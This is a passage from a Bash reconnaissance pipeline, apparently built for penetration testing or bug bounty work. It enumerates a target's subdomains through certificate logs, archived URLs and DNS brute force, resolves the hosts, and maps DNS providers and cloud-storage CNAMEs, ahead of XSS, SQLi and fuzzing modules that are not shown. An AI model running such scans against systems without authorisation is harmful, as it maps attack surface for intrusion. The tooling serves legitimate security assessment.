    # Create module subdirectories
    mkdir -p "$OUTPUT_DIR/01_asset_discovery"
    mkdir -p "$OUTPUT_DIR/02_subdomain_enum"
    mkdir -p "$OUTPUT_DIR/03_dns_resolution"
    mkdir -p "$OUTPUT_DIR/04_http_discovery"
    mkdir -p "$OUTPUT_DIR/05_waf_detection"
    mkdir -p "$OUTPUT_DIR/06_header_analysis"
    mkdir -p "$OUTPUT_DIR/07_service_fingerprint"
    mkdir -p "$OUTPUT_DIR/08_directory_discovery"
    mkdir -p "$OUTPUT_DIR/09_crawling"
    mkdir -p "$OUTPUT_DIR/10_secret_scanning"
    mkdir -p "$OUTPUT_DIR/11_param_fuzzing"
    mkdir -p "$OUTPUT_DIR/12_nuclei_scanning"
    mkdir -p "$OUTPUT_DIR/13_xss_testing"
    mkdir -p "$OUTPUT_DIR/14_port_scan"
    mkdir -p "$OUTPUT_DIR/15_sqli_testing"
    mkdir -p "$OUTPUT_DIR/16_api_security"
    mkdir -p "$OUTPUT_DIR/17_cloud_exposure"
    mkdir -p "$OUTPUT_DIR/18_osint_intel"
    mkdir -p "$OUTPUT_DIR/22_shodan_correlation"
    mkdir -p "$OUTPUT_DIR/23_internet_intel"
    mkdir -p "$OUTPUT_DIR/20_api_deep_discovery"
    mkdir -p "$OUTPUT_DIR/20.1_api_sqli_testing"
    mkdir -p "$OUTPUT_DIR/21_subdomain_takeover"
    mkdir -p "$OUTPUT_DIR/03c_dns_security"
    mkdir -p "$OUTPUT_DIR/14_reporting"
    mkdir -p "$OUTPUT_DIR/reports"
    mkdir -p "$OUTPUT_DIR/04_http_discovery/responses"
    
    log_section "Directory structure created"
    log_info "Scan ID: ${safe_target}-${scan_timestamp}"
    log_info "Output: $OUTPUT_DIR"
}

check_dependencies() {
    log_info "Checking dependencies..."
    
    local required_tools=("jq" "curl" "python3" "go")
    local recon_tools=("subfinder" "puredns" "dnsx" "naabu" "httpx" "nuclei" "gau" \
                       "gospider" "katana" "wafw00f" "nmap" "dirsearch" "trufflehog" \
                       "ffuf" "gf" "dalfox")
    local missing_required=()
    local missing_recon=()
    
    # Check required system tools
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing_required+=("$tool")
            log_error "Missing required tool: $tool"
        fi
    done
    
    # Check recon tools (optional but recommended)
    for tool in "${recon_tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing_recon+=("$tool")
            log_warn "Missing recon tool: $tool"
        fi
    done
    
    # Fail if required tools are missing
    if [ ${#missing_required[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_required[*]}"
        log_error "Please install them first"
        return 1
    fi
    
    # Warn about missing recon tools
    if [ ${#missing_recon[@]} -gt 0 ]; then
        log_warn "Missing recon tools: ${missing_recon[*]}"
        log_warn "Install them with: bash setup.sh"
        log_warn "Continuing with available tools..."
    else
        log_info "All dependencies available"
    fi
    
    return 0
}

download_wordlists() {
    local list_dir="$PROJECT_ROOT/lists"
    mkdir -p "$list_dir"

    download_if_missing() {
        local url="$1"
        local dest="$2"
        if [ -f "$dest" ]; then
            return 0
        fi
        if ! curl -fsSL "$url" -o "$dest" 2>/dev/null; then
            log_warn "Failed to download $(basename "$dest")"
        fi
    }
    
    download_if_missing \
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt" \
        "$list_dir/subdomains-top1million-110000.txt"

    download_if_missing \
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" \
        "$list_dir/common.txt"

    download_if_missing \
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt" \
        "$list_dir/LFI-Jhaddix.txt"

    download_if_missing \
        "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt" \
        "$list_dir/resolvers.txt"
    
    WORDLIST_DIR="$list_dir"
    log_info "Wordlists ready"
}

###################################################################################################
# MODULE 1: ASSET DISCOVERY
###################################################################################################

module_asset_discovery() {
    local target="$1"
    log_section "MODULE 1: Asset Discovery"
    log_info "Target: $target"
    
    local output_file="$OUTPUT_DIR/01_asset_discovery/$(make_iso_filename "$target" "asset_discovery" "results")"
    local start_time=$(date +%s)
    
    # Certificate Transparency
    log_info "Querying crt.sh..."
    curl -s "https://crt.sh/?q=%25.${target}&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' | sed 's/\*\.//g' | \
        awk -v root="$target" '$0 == root || substr($0, length($0)-length(root)) == "." root' | \
        sort -u > "$OUTPUT_DIR/01_asset_discovery/ct_domains.txt"

    # Historical URLs are an asset source: they reveal hosts, paths, JS and parameters.
    local gau_status="unavailable"
    local gau_urls="$OUTPUT_DIR/01_asset_discovery/gau_urls.txt"
    local gau_hosts="$OUTPUT_DIR/01_asset_discovery/gau_hosts.txt"
    local gau_cache="$PROJECT_ROOT/state/$target/gau_cache.txt"
    > "$gau_urls"
    > "$gau_hosts"
    mkdir -p "$PROJECT_ROOT/state/$target" 2>/dev/null
    if command -v "$GAU" &>/dev/null; then
        log_info "Discovering historical assets with gau..."
        if run_tool gau "$GAU" --subs --threads 5 --timeout 45 "$target" | sort -u > "$gau_urls"; then
            gau_status="completed"
        else
            gau_status="failed"
            log_warn "gau failed; continuing with CT and enumeration sources"
        fi
        local gau_live_count=$(count_lines "$gau_urls")
        # Fallback: Wayback CDX API when gau returns 0 (rate-limited / API down)
        if [ "$gau_live_count" -eq 0 ]; then
            log_warn "gau returned 0 URLs; querying Wayback CDX API directly..."
            local cdx_tmp="${gau_urls}.cdx_tmp"
            > "$cdx_tmp"
            # Wildcard query gets root/www
            curl -s --max-time 60 "http://web.archive.org/cdx/search/cdx?url=*.${target}/*&output=text&fl=original&collapse=urlkey" >> "$cdx_tmp" 2>/dev/null || true
            # Per-subdomain queries for CT-discovered hosts (CDX wildcard misses most subdomains)
            local ct_file="$OUTPUT_DIR/01_asset_discovery/ct_domains.txt"
            if [ -s "$ct_file" ]; then
                local cdx_sub_count=0
                while IFS= read -r subdomain; do
                    [ -z "$subdomain" ] && continue
                    [ "$subdomain" = "$target" ] && continue
                    [ "$subdomain" = "www.$target" ] && continue
                    curl -s --max-time 20 "http://web.archive.org/cdx/search/cdx?url=${subdomain}/*&output=text&fl=original&collapse=urlkey" >> "$cdx_tmp" 2>/dev/null || true
                    cdx_sub_count=$((cdx_sub_count + 1))
                    [ "$cdx_sub_count" -ge 15 ] && break
                done < "$ct_file"
                log_info "CDX queried $cdx_sub_count subdomains"
            fi
            # Wayback CDX returns *any* URL that mentions the target — including
            # off-scope pages that merely LINK to the target (search results,
            # blogs, referring pages). Filter to in-scope hosts only so the URL
            # inventory stays clean.
            sort -u "$cdx_tmp" | _scope_urls_awk "$target" > "$gau_urls"
            rm -f "$cdx_tmp"
            gau_live_count=$(count_lines "$gau_urls")
            if [ "$gau_live_count" -gt 0 ]; then
                log_info "Wayback CDX fallback recovered $gau_live_count URLs"
                gau_status="cdx-fallback"
            fi
        fi
        # Merge with cache: CDX may miss subdomains that gau found previously.
        # Always combine live + cached data for maximum coverage.
        if [ "$gau_live_count" -gt 0 ] && [ -s "$gau_cache" ]; then
            local pre_merge=$gau_live_count
            sort -u "$gau_urls" "$gau_cache" > "${gau_urls}.merged"
            mv "${gau_urls}.merged" "$gau_urls"
            gau_live_count=$(count_lines "$gau_urls")
            local merged_extra=$((gau_live_count - pre_merge))
            [ "$merged_extra" -gt 0 ] && log_info "Merged $merged_extra cached URLs not in live data"
        fi
        # Cache successful results for future resilience
        if [ "$gau_live_count" -gt 0 ]; then
            cp "$gau_urls" "$gau_cache" 2>/dev/null
        elif [ -s "$gau_cache" ]; then
            log_warn "All URL sources failed; using cached gau data from previous scan"
            cp "$gau_cache" "$gau_urls"
            gau_status="cached"
        fi
        # Extract in-scope hosts from URLs (single-shot helper — was 4 copies
        # of the same awk with subtle case-sensitivity drift).
        _scope_urls_awk "$target" < "$gau_urls" \
            | awk -F/ '{h=$3; sub(/:.*/, "", h); print tolower(h)}' \
            | sort -u > "$gau_hosts"
    else
        log_warn "gau is not installed; historical asset discovery is unavailable"
        # Still try Wayback CDX API even without gau
        log_info "Attempting Wayback CDX API as standalone fallback..."
        local cdx_tmp="${gau_urls}.cdx_tmp"
        > "$cdx_tmp"
        curl -s --max-time 60 "http://web.archive.org/cdx/search/cdx?url=*.${target}/*&output=text&fl=original&collapse=urlkey" >> "$cdx_tmp" 2>/dev/null || true
        local ct_file="$OUTPUT_DIR/01_asset_discovery/ct_domains.txt"
        if [ -s "$ct_file" ]; then
            local cdx_sub_count=0
            while IFS= read -r subdomain; do
                [ -z "$subdomain" ] && continue
                [ "$subdomain" = "$target" ] && continue
                [ "$subdomain" = "www.$target" ] && continue
                curl -s --max-time 20 "http://web.archive.org/cdx/search/cdx?url=${subdomain}/*&output=text&fl=original&collapse=urlkey" >> "$cdx_tmp" 2>/dev/null || true
                cdx_sub_count=$((cdx_sub_count + 1))
                [ "$cdx_sub_count" -ge 15 ] && break
            done < "$ct_file"
        fi
        # Scope-filter CDX output — same reason as the fallback branch above.
        sort -u "$cdx_tmp" | _scope_urls_awk "$target" > "$gau_urls"
        rm -f "$cdx_tmp"
        if [ -s "$gau_urls" ]; then
            gau_status="cdx-only"
            _scope_urls_awk "$target" < "$gau_urls" \
                | awk -F/ '{h=$3; sub(/:.*/, "", h); print tolower(h)}' \
                | sort -u > "$gau_hosts"
            log_info "CDX API discovered $(count_lines "$gau_urls") URLs"
        elif [ -s "$gau_cache" ]; then
            log_warn "CDX API also failed; using cached gau data"
            cp "$gau_cache" "$gau_urls"
            gau_status="cached"
            _scope_urls_awk "$target" < "$gau_urls" \
                | awk -F/ '{h=$3; sub(/:.*/, "", h); print tolower(h)}' \
                | sort -u > "$gau_hosts"
        fi
    fi
    
    local ct_count=$(count_lines "$OUTPUT_DIR/01_asset_discovery/ct_domains.txt")
    local gau_url_count=$(count_lines "$gau_urls")
    local gau_host_count=$(count_lines "$gau_hosts")
    log_info "Asset sources: CT=$ct_count hosts, gau=$gau_host_count hosts/$gau_url_count URLs"
    
    # Create scope
    mkdir -p "$PROJECT_ROOT/scope"
    echo "$target" > "$PROJECT_ROOT/scope/roots.txt"
    
    local end_time=$(date +%s)
    jq -n --arg target "$target" --arg timestamp "$(date -Iseconds)" --arg gau_status "$gau_status" \
        --argjson ct "$ct_count" --argjson gau_hosts "$gau_host_count" --argjson gau_urls "$gau_url_count" \
        --argjson duration "$((end_time - start_time))" \
        '{module:"asset_discovery", target:$target, timestamp:$timestamp, root_domains:[$target], sources:{crt_sh:{status:"completed",hosts:$ct},gau:{status:$gau_status,hosts:$gau_hosts,urls:$gau_urls}}, duration_seconds:$duration}' \
        > "$output_file"
    
    log_info "Asset discovery completed"
    echo "$output_file"
}

###################################################################################################
# MODULE 2: SUBDOMAIN ENUMERATION
###################################################################################################

module_subdomain_enum() {
    local target="$1"
    log_section "MODULE 2: Subdomain Enumeration"
    
    local output_file="$OUTPUT_DIR/02_subdomain_enum/$(make_iso_filename "$target" "subdomain_enum" "results")"
    local start_time=$(date +%s)
    local all_subs="$OUTPUT_DIR/02_subdomain_enum/all_subdomains.txt"
    
    > "$all_subs"
    printf '%s\n' "$target" >> "$all_subs"

    # Reuse Module 1 outputs instead of querying the same source and discarding gau hosts.
    [ -s "$OUTPUT_DIR/01_asset_discovery/ct_domains.txt" ] && cat "$OUTPUT_DIR/01_asset_discovery/ct_domains.txt" >> "$all_subs"
    [ -s "$OUTPUT_DIR/01_asset_discovery/gau_hosts.txt" ] && cat "$OUTPUT_DIR/01_asset_discovery/gau_hosts.txt" >> "$all_subs"
    
    # Passive: crt.sh
    log_info "Passive: crt.sh..."
    if [ ! -s "$OUTPUT_DIR/01_asset_discovery/ct_domains.txt" ]; then
        curl -s "https://crt.sh/?q=%25.${target}&output=json" 2>/dev/null | \
            jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' | sed 's/\*\.//g' >> "$all_subs"
    fi
    
    # Passive: subfinder
    log_info "Passive: subfinder..."
    command -v "$SUBFINDER" &>/dev/null && run_tool subfinder "$SUBFINDER" -d "$target" -silent >> "$all_subs"
    
    # Active: puredns brute force with conservative bandwidth limits by default.
    local puredns_status="skipped"
    local puredns_wordlist="$OUTPUT_DIR/02_subdomain_enum/puredns_wordlist_limited.txt"
    local puredns_resolvers="$OUTPUT_DIR/02_subdomain_enum/puredns_resolvers_limited.txt"
    local puredns_results="$OUTPUT_DIR/02_subdomain_enum/bruteforce.txt"
    if [ "$PUREDNS_ENABLED" = "false" ]; then
        log_warn "puredns brute force disabled by PUREDNS_ENABLED=false"
    elif ! command -v "$PUREDNS" &>/dev/null; then
        log_warn "puredns not installed, skipping active brute force"
    elif [ -f "$WORDLIST_DIR/subdomains-top1million-110000.txt" ] && [ -f "$WORDLIST_DIR/resolvers.txt" ]; then
        log_info "Active: puredns brute force with rate limit ${PUREDNS_RATE_LIMIT} qps, ${PUREDNS_THREADS} wildcard threads..."

        head -n "$PUREDNS_WORDLIST_LIMIT" "$WORDLIST_DIR/subdomains-top1million-110000.txt" > "$puredns_wordlist"
        head -n "$PUREDNS_RESOLVER_LIMIT" "$WORDLIST_DIR/resolvers.txt" > "$puredns_resolvers"

        "$PUREDNS" bruteforce "$puredns_wordlist" "$target" \
            -r "$puredns_resolvers" \
            --rate-limit "$PUREDNS_RATE_LIMIT" \
            --rate-limit-trusted "$PUREDNS_TRUSTED_RATE_LIMIT" \
            --threads "$PUREDNS_THREADS" \
            --wildcard-batch "$PUREDNS_WILDCARD_BATCH" \
            --wildcard-tests "$PUREDNS_WILDCARD_TESTS" \
            -w "$puredns_results" 2>"$OUTPUT_DIR/02_subdomain_enum/puredns.stderr" || puredns_status="failed"

        [ "$puredns_status" = "skipped" ] && puredns_status="completed"
        [ -f "$puredns_results" ] && cat "$puredns_results" >> "$all_subs"
    else
        log_warn "puredns wordlist or resolver list missing, skipping active brute force"
    fi

    # Intelligent brute-force pass: mutate ALREADY-discovered labels
    # (dev-<label>, <label>-staging, api-<label>, etc.) and try a cloud/env
    # wordlist, resolving each candidate. Discoveries flow into all_subs BEFORE
    # dedup so Module 3 (DNS resolution), Module 4 (httpx), Module 5 (WAF),
    # and every downstream scanner see them as first-class hosts.
    # Previously ran in Module 24 (Advanced Attacks) — near end of pipeline —
    # which meant new subdomains were DISCOVERED but never SCANNED. Moved
    # here to make discoveries actually useful.
    local brute_script="$PROJECT_ROOT/recon/subdomain_bruteforce.py"
    [ ! -f "$brute_script" ] && brute_script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/recon/subdomain_bruteforce.py"
    local brute_status="skipped"
    if [ -f "$brute_script" ] && command -v python3 &>/dev/null && [ "${SUBDOMAIN_BRUTEFORCE_ENABLED:-true}" = "true" ]; then
        log_info "Intelligent brute-force: pattern-mutating known labels + cloud/env wordlist..."
        local brute_out="$OUTPUT_DIR/02_subdomain_enum/brute_subdomains.txt"
        if python3 "$brute_script" "$OUTPUT_DIR" \
                --root "$target" \
                --out "$brute_out" \
                --jsonl-out "$OUTPUT_DIR/02_subdomain_enum/subdomain_brute_findings.jsonl" \
                --max-candidates "${SUBDOMAIN_BRUTE_MAX_CANDIDATES:-5000}" \
                2>"$OUTPUT_DIR/02_subdomain_enum/brute.stderr"; then
            brute_status="completed"
            if [ -s "$brute_out" ]; then
                local brute_new=$(count_lines "$brute_out")
                log_info "Intelligent brute-force: $brute_new new subdomain(s) → feeding into DNS resolution"
                cat "$brute_out" >> "$all_subs"
            fi
        else
            brute_status="failed"
            log_warn "recon/subdomain_bruteforce.py returned non-zero (continuing)"
        fi
    fi

    # Deduplicate
    awk -v root="$target" '$0 == root || substr($0, length($0)-length(root)) == "." root' "$all_subs" | sort -u > "${all_subs}.tmp"
    mv "${all_subs}.tmp" "$all_subs"
    
    local total=$(count_lines "$all_subs")
    log_info "Total subdomains: $total"
    
    # Update manifest — batched into ONE pass. Previously this loop called
    # update_manifest twice per subdomain, each spawning 2-3 jq that rewrote the
    # entire (growing) manifest: O(N^2) I/O and the single biggest recon stall on
    # large host sets. Now: build one host->delta TSV, merge in a single pass.
    local _mtsv="$OUTPUT_DIR/02_subdomain_enum/.manifest_delta.tsv"
    awk 'NF{printf "%s\t{\"resolved\": false, \"source\": \"subdomain_enum\"}\n", $0}' \
        "$all_subs" > "$_mtsv"
    update_manifest_stream "$_mtsv"
    rm -f "$_mtsv"
    
    update_statistics "total_hosts" "$total"
    TOTAL_HOSTS=$total
    
    # Create output JSON
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "subdomain_enum",
  "target": "$target",
  "timestamp": "$(date -Iseconds)",
  "total_subdomains": $total,
  "puredns": {
    "status": "$puredns_status",
    "enabled": "$PUREDNS_ENABLED",
    "wordlist_limit": $PUREDNS_WORDLIST_LIMIT,
    "resolver_limit": $PUREDNS_RESOLVER_LIMIT,
    "rate_limit_qps": $PUREDNS_RATE_LIMIT,
    "trusted_rate_limit_qps": $PUREDNS_TRUSTED_RATE_LIMIT,
    "wildcard_threads": $PUREDNS_THREADS,
    "wildcard_batch": $PUREDNS_WILDCARD_BATCH,
    "wildcard_tests": $PUREDNS_WILDCARD_TESTS
  },
  "intelligent_bruteforce": {
    "status": "$brute_status",
    "enabled": "${SUBDOMAIN_BRUTEFORCE_ENABLED:-true}",
    "max_candidates": "${SUBDOMAIN_BRUTE_MAX_CANDIDATES:-5000}"
  },
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "Subdomain enumeration completed: $total subdomains"
    echo "$output_file"
}

###################################################################################################
# MODULE 3: DNS RESOLUTION AND CDN FILTERING
###################################################################################################

module_dns_resolution() {
    local target="$1"
    log_section "MODULE 3: DNS Resolution"
    
    local all_subs="$OUTPUT_DIR/02_subdomain_enum/all_subdomains.txt"
    [ ! -f "$all_subs" ] && { log_error "No subdomains found"; return 1; }
    command -v "$DNSX" &>/dev/null || { log_error "dnsx is required for DNS resolution"; return 1; }
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/03_dns_resolution/$(make_iso_filename "$target" "dns_resolution" "results")"
    
    # Resolve with dnsx - get ALL IPs (including CDN)
    log_info "Resolving subdomains..."
    run_tool dnsx $DNSX -l "$all_subs" -json -o "$OUTPUT_DIR/03_dns_resolution/dns_results.json" -t 100 -silent

    # ── DoH fallback ──────────────────────────────────────────────────────
    # The system :53 resolver can fail silently (transient timeout — this is
    # what zeroed the www.toursgds.com scan) or be HIJACKED (captive portal /
    # ISP returns our own egress IP or parked space). Either way dnsx yields an
    # empty or poisoned dns_results.json and the ENTIRE scan dies downstream
    # (no resolved.txt → no httpx targets → no http_hosts → every module skips).
    # Detect that and re-resolve the SAME host list over DoH (HTTPS/443 to
    # 1.1.1.1 + 8.8.8.8), which the :53 interception/hijack cannot touch.
    local doh_script="$PROJECT_ROOT/recon/doh_resolve.py"
    local dns_json="$OUTPUT_DIR/03_dns_resolution/dns_results.json"
    [ -f "$dns_json" ] || : > "$dns_json"
    if [ "${DOH_FALLBACK_ENABLED:-true}" = "true" ] && [ -f "$doh_script" ] && command -v python3 &>/dev/null; then
        local doh_verdict doh_refetch doh_reason
        doh_verdict="$(python3 "$doh_script" check --dnsx-json "$dns_json" 2>/dev/null)"
        doh_refetch="$(printf '%s' "$doh_verdict" | jq -r '.refetch // false' 2>/dev/null)"
        doh_reason="$(printf '%s' "$doh_verdict" | jq -r '.reason // "unknown"' 2>/dev/null)"
        if [ "$doh_refetch" = "true" ]; then
            log_warn "System DNS unusable ($doh_reason) — re-resolving over DoH (1.1.1.1 + 8.8.8.8)"
            python3 "$doh_script" resolve --input "$all_subs" --output "$dns_json" 2>&1 \
                | while read -r ln; do log_info "$ln"; done || true
        else
            log_info "DNS resolution trusted ($doh_reason)"
        fi
    fi

    # Extract ALL resolved hosts (including CDN)
    # Always create resolved.txt (even if empty) so downstream modules don't fail on missing file
    if [ -f "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ]; then
        jq -r 'select(.a != null) | .host' "$OUTPUT_DIR/03_dns_resolution/dns_results.json" | sort -u > "$OUTPUT_DIR/03_dns_resolution/resolved.txt"
    else
        log_warn "dnsx produced no output — resolved.txt will be empty"
        : > "$OUTPUT_DIR/03_dns_resolution/resolved.txt"
    fi

    local resolved=$(count_lines "$OUTPUT_DIR/03_dns_resolution/resolved.txt")
    log_info "Resolved: $resolved hosts"
    
    # Extract ALL IPs
    [ -f "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ] && \
        jq -r '.a[]?' "$OUTPUT_DIR/03_dns_resolution/dns_results.json" | sort -u > "$OUTPUT_DIR/03_dns_resolution/all_ips.txt"
    
    # Get IP annotations (ASN, PTR, CDN detection) for analysis only
    if [ -f "$OUTPUT_DIR/03_dns_resolution/all_ips.txt" ]; then
        log_info "Getting IP metadata (ASN, PTR, CDN info)..."
        run_tool dnsx_meta $DNSX -l "$OUTPUT_DIR/03_dns_resolution/all_ips.txt" -ptr -asn -cdn -json \
            -o "$OUTPUT_DIR/03_dns_resolution/ip_annotations.json" -silent
        
        # Extract CDN info and IPs
        [ -f "$OUTPUT_DIR/03_dns_resolution/ip_annotations.json" ] && \
            jq -r 'select(.cdn_name != null or .cdn == true or .is_cdn == true) | .host' "$OUTPUT_DIR/03_dns_resolution/ip_annotations.json" 2>/dev/null | \
            sort -u > "$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt"
        
        local cdn_count=$(count_lines "$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt")
        log_info "CDN IPs detected: $cdn_count (for informational purposes, will be scanned)"

        # cdn_hosts.txt — hostname allowlist derived from dnsx CDN detection.
        # Downstream (ports/port_split.py) reads this to drop non-web ports on CDN
        # edges without re-computing the host->cdn mapping. Web ports are
        # kept regardless (CDN skip applies ONLY to non-web).
        if [ -s "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ] && \
           [ -s "$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt" ] && \
           command -v python3 &>/dev/null; then
            python3 - "$OUTPUT_DIR/03_dns_resolution/dns_results.json" \
                     "$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt" \
                     "$OUTPUT_DIR/03_dns_resolution/cdn_hosts.txt" \
                     << 'PY_CDN_HOSTS' 2>/dev/null || true
import json, sys
res, cdnf, out = sys.argv[1:4]
cdn = set()
for l in open(cdnf, errors="ignore"):
    l = l.strip()
    if l: cdn.add(l)
hosts = set()
for line in open(res, errors="ignore"):
    line = line.strip()
    if not line: continue
    try: r = json.loads(line)
    except Exception: continue
    h = (r.get("host") or "").lower()
    if not h: continue
    for ip in (r.get("a") or []):
        if ip in cdn:
            hosts.add(h); break
with open(out, "w") as w:
    for h in sorted(hosts): w.write(h + "\n")
PY_CDN_HOSTS
            local cdn_hosts_count=$(count_lines "$OUTPUT_DIR/03_dns_resolution/cdn_hosts.txt")
            log_info "CDN hosts identified: $cdn_hosts_count (non-web ports will be dropped)"
        fi
    fi
    
    # Update manifest — batched. Was: one update_manifest_bulk (2-3 jq, whole-file
    # rewrite) plus a grep against cdn_ips.txt PER resolved host. Now: build all
    # host->{resolved,ip,cdn} deltas in one Python pass (CDN set loaded once), then
    # a single merge. Pure local I/O — no network, no WAF exposure.
    if [ -f "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ]; then
        local _mtsv="$OUTPUT_DIR/03_dns_resolution/.manifest_delta.tsv"
        local _cdn_file="$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt"
        [ -f "$_cdn_file" ] || _cdn_file=/dev/null
        python3 - "$OUTPUT_DIR/03_dns_resolution/dns_results.json" "$_cdn_file" "$_mtsv" <<'PY_DNS_DELTA' 2>/dev/null
import json, sys
res, cdnf, out = sys.argv[1], sys.argv[2], sys.argv[3]
cdn = set()
try:
    for l in open(cdnf, errors="ignore"):
        l = l.strip()
        if l:
            cdn.add(l)
except Exception:
    pass
seen = set()
with open(out, "w") as w:
    for line in open(res, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            e = json.loads(line)
        except Exception:
            continue
        h = e.get("host")
        a = e.get("a") or []
        if not h or not a or h in seen:
            continue
        seen.add(h)
        ip = a[0]
        w.write("%s\t%s\n" % (h, json.dumps({"resolved": True, "ip": ip, "cdn": ip in cdn})))
PY_DNS_DELTA
        update_manifest_stream "$_mtsv"
        rm -f "$_mtsv"
    fi
    
    update_statistics "resolved_hosts" "$resolved"
    RESOLVED_HOSTS=$resolved
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "dns_resolution",
  "resolved_hosts": $resolved,
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "DNS resolution completed: $resolved resolved"
    echo "$output_file"
}
###################################################################################################
# MODULE 3B: DNS DISCOVERY — Full Zone Enumeration, Authoritative NS, SOA Audit,
#             Cloud Storage CNAME Extraction (S3/Azure Blob/GCP Storage)
#
# Queries every record type (A, AAAA, CNAME, MX, TXT, NS, SOA, SRV, CAA, PTR)
# for every resolved subdomain + the apex. Detects SOA serial mismatches across
# nameservers, maps authoritative NS to known providers, and extracts cloud
# storage targets (S3/Azure/GCP) from CNAME chains for downstream bucket enum.
###################################################################################################

module_dns_discovery() {
    local target="$1"
    log_section "MODULE 3B: DNS Discovery (Full Zone Enumeration)"

    command -v dig &>/dev/null || { log_warn "dig is required for DNS discovery; skipping"; return 0; }

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/03b_dns_discovery"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "dns_discovery" "results")"

    # Collect all subdomains + apex
    local subs_file="$OUTPUT_DIR/03_dns_resolution/resolved.txt"
    [ ! -f "$subs_file" ] && subs_file="$OUTPUT_DIR/02_subdomain_enum/all_subdomains.txt"
    [ ! -f "$subs_file" ] && { log_warn "No subdomains file found; skipping DNS discovery"; return 0; }

    local all_hosts="$base_dir/all_hosts.txt"
    { echo "$target"; cat "$subs_file" 2>/dev/null; } | sort -u > "$all_hosts"

    local host_count
    host_count=$(count_lines "$all_hosts")
    log_info "Enumerating DNS records for $host_count hosts (+ apex: $target)..."

    python3 - "$target" "$all_hosts" "$base_dir" "$MANIFEST_FILE" << 'DNSDISC_EOF'
import subprocess, json, sys, re, os
from collections import defaultdict

target     = sys.argv[1]
hosts_file = sys.argv[2]
base_dir   = sys.argv[3]
manifest_f = sys.argv[4]

RECORD_TYPES = ['A', 'AAAA', 'CNAME', 'MX', 'TXT', 'NS', 'SOA', 'SRV', 'CAA']

# ── Known NS provider fingerprints ──────────────────────────────────
NS_PROVIDERS = {
    'awsdns':            {'name': 'Amazon Route 53',   'provider': 'aws',         'logo': 'aws'},
    'azure-dns':         {'name': 'Azure DNS',         'provider': 'azure',       'logo': 'azure'},
    'googledomains':     {'name': 'Google Domains',    'provider': 'gcp',         'logo': 'gcp'},
    'google.com':        {'name': 'Google Cloud DNS',  'provider': 'gcp',         'logo': 'gcp'},
    'cloudflare':        {'name': 'Cloudflare',        'provider': 'cloudflare',  'logo': 'cloudflare'},
    'nsone.net':         {'name': 'NS1 (IBM)',         'provider': 'ns1',         'logo': 'cloud'},
    'ultradns':          {'name': 'Neustar UltraDNS',  'provider': 'neustar',     'logo': 'cloud'},
    'dnsmadeeasy':       {'name': 'DNS Made Easy',     'provider': 'dme',         'logo': 'cloud'},
    'domaincontrol':     {'name': 'GoDaddy',           'provider': 'godaddy',     'logo': 'cloud'},
    'registrar-servers': {'name': 'Namecheap',         'provider': 'namecheap',   'logo': 'cloud'},
    'hetzner':           {'name': 'Hetzner',           'provider': 'hetzner',     'logo': 'cloud'},
    'digitalocean':      {'name': 'DigitalOcean',      'provider': 'digitalocean','logo': 'cloud'},
    'linode':            {'name': 'Linode/Akamai',     'provider': 'akamai',      'logo': 'cloud'},
    'dynect':            {'name': 'Dyn (Oracle)',      'provider': 'oracle',      'logo': 'cloud'},
    'name-services.com': {'name': 'Enom',             'provider': 'enom',        'logo': 'cloud'},
}

# ── Cloud storage CNAME patterns ────────────────────────────────────
CLOUD_CNAME_PATTERNS = [
    # AWS S3 — regional
    (re.compile(r'\.s3[.-](?:website-)?([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com\.?$', re.I),
     'aws', 's3', 'direct_s3'),
    # AWS S3 — global endpoint
    (re.compile(r'\.s3\.amazonaws\.com\.?$', re.I),
     'aws', 's3', 'direct_s3'),
    # AWS S3 — dualstack
    (re.compile(r'\.s3\.dualstack\.([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com\.?$', re.I),
     'aws', 's3', 'direct_s3'),
    # AWS CloudFront (potential S3 origin — needs header confirmation)
    (re.compile(r'\.cloudfront\.net\.?$', re.I),
     'aws', 'cloudfront', 'cloudfront_proxy'),
    # Azure Blob Storage
    (re.compile(r'\.blob\.core\.windows\.net\.?$', re.I),
     'azure', 'blob', 'direct_azure_blob'),
    # Azure Static Web Apps
    (re.compile(r'\.azurestaticapps\.net\.?$', re.I),
     'azure', 'static_web', 'azure_static'),
    # Azure CDN
    (re.compile(r'\.azureedge\.net\.?$', re.I),
     'azure', 'cdn', 'azure_cdn_proxy'),
    # GCP Storage
    (re.compile(r'\.storage\.googleapis\.com\.?$', re.I),
     'gcp', 'gcs', 'direct_gcs'),
    (re.compile(r'\.storage-download\.googleapis\.com\.?$', re.I),
     'gcp', 'gcs', 'direct_gcs'),
    # DigitalOcean Spaces
    (re.compile(r'\.digitaloceanspaces\.com\.?$', re.I),
     'digitalocean', 'spaces', 'direct_do_spaces'),
    # Alibaba OSS
    (re.compile(r'\.oss[.-][a-z0-9-]+\.aliyuncs\.com\.?$', re.I),
     'alibaba', 'oss', 'direct_ali_oss'),
